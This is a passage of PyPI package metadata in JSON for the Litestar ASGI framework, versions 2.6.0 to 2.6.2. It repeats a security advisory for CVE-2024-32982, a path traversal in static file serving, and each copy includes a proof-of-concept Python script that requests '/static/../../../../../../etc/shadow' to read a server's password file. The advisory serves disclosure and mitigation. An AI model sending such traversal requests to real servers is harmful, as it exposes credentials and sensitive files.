Framework","version":"2.6.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"11968d2128a4a419bc416814eaa60c7d714435e42e300589bb18ebf20933dd27","md5":"7290455bf895681f59cdb0d860954764","sha256":"c0de3a1d99c1aaf3b926b9a3b054c08249a7bb3bf580e967cf79c3b8d9b8dda8"},"downloads":-1,"filename":"litestar-2.6.0-py3-none-any.whl","has_sig":false,"md5_digest":"7290455bf895681f59cdb0d860954764","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":507063,"upload_time":"2024-02-06T18:41:22","upload_time_iso_8601":"2024-02-06T18:41:22.721277Z","url":"https://files.pythonhosted.org/packages/11/96/8d2128a4a419bc416814eaa60c7d714435e42e300589bb18ebf20933dd27/litestar-2.6.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"da1fc0c90de22e3d68246e49d8c80b17de05e0cafc9a27b0cb8b40bfb2ddbd1a","md5":"1edec06dd37159758b7f1e77071f7d85","sha256":"b665f55fb75e13808ceb237a7590ee1f1393de41e73ecdf6016efee5b2f0a605"},"downloads":-1,"filename":"litestar-2.6.0.tar.gz","has_sig":false,"md5_digest":"1edec06dd37159758b7f1e77071f7d85","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":650688,"upload_time":"2024-02-06T18:41:25","upload_time_iso_8601":"2024-02-06T18:41:25.187777Z","url":"https://files.pythonhosted.org/packages/da/1f/c0c90de22e3d68246e49d8c80b17de05e0cafc9a27b0cb8b40bfb2ddbd1a/litestar-2.6.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.6.1":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.6.1/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.6.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"59d6e6993816c97d9d3dca8f069bcd0a9cc8143a624f588dce6b9665d0aa7489","md5":"4d14a1497f9a1ba691ce6b7c94992277","sha256":"33451b705f04f1f1ee991c28502afc2ce1b5ca5df25f0ae6ae8cf11063397e42"},"downloads":-1,"filename":"litestar-2.6.1-py3-none-any.whl","has_sig":false,"md5_digest":"4d14a1497f9a1ba691ce6b7c94992277","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":507715,"upload_time":"2024-02-14T14:37:31","upload_time_iso_8601":"2024-02-14T14:37:31.227473Z","url":"https://files.pythonhosted.org/packages/59/d6/e6993816c97d9d3dca8f069bcd0a9cc8143a624f588dce6b9665d0aa7489/litestar-2.6.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"107459b659d57ea01426f8f795907031b2179b84b2127c85cc294c182225369e","md5":"8d72afc43a597b98dd65b76decb31eee","sha256":"3232190578d81180cce765840dfe72ef6b5d7ec2aead6fc37d664e61d8e2f647"},"downloads":-1,"filename":"litestar-2.6.1.tar.gz","has_sig":false,"md5_digest":"8d72afc43a597b98dd65b76decb31eee","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":652167,"upload_time":"2024-02-14T14:37:33","upload_time_iso_8601":"2024-02-14T14:37:33.747867Z","url":"https://files.pythonhosted.org/packages/10/74/59b659d57ea01426f8f795907031b2179b84b2127c85cc294c182225369e/litestar-2.6.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.6.2":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.6.2/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.6.2","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"85b6de8bd034a34822ae99312ed0454221414b058f5b0d9a1383d38c95e81780","md5":"95b37c1ef28302e98c3ead39ffd5eb06","sha256":"f898c0fab8243fa0d772e3bd0677b86d2e6bc61e0f8f437d39edc91fcbce967a"},"downloads":-1,"filename":"litestar-2.6.2-py3-none-any.whl","has_sig":false,"md5_digest":"95b37c1ef28302e98c3ead39ffd5eb06","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":509066,"upload_time":"2024-03-02T17:32:05","upload_time_iso_8601":"2024-03-02T17:32:05.048069Z","url":"https://files.pythonhosted.org/packages/85/b6/de8bd034a34822ae99312ed0454221414b058f5b0d9a1383d38c95e81780/litestar-2.6.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8cddce38539ae6ad5d7c50535ebdd18824387ba3c2c35715e8d97c2934adbf3a","md5":"2df92653bafb7eb0350a19393e07e253","sha256":"13e924370034803e91cc2e6061692f95a697461352253f3593c5fbcf746e3e45"},"downloads":-1,"filename":"litestar-2.6.2.tar.gz","has_sig":false,"md5_digest":"2df92653bafb7eb0350a19393e07e253","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":655299,"upload_time":"2024-03-02T17:32:07","upload_time_iso_8601":"2024-03-02T17:32:07.597348Z","url":"https://files.pythonhosted.org/packages/8c/dd/ce38539ae6ad5d7c50535ebdd18824387ba3c2c35715e8d97c2934adbf3a/litestar-2.6.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the 